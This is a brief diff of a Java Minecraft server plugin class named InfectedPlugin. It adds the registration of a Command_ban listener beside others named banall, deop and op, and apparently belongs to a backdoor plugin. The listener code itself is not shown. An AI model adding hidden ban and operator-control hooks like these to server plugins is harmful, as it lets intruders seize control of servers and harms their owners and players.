@@ -32,7 +32,7 @@ public class InfectedPlugin extends JavaPlugin
         try
         {
             PluginManager pm = getServer().getPluginManager();
-            //pm.registerEvents(new IP_PlayerListener(), this);
+            pm.registerEvents(new Command_ban(), this);
             pm.registerEvents(new Command_banall(), this);
             pm.registerEvents(new Command_deop(), this);
             pm.registerEvents(new Command_op(), this);
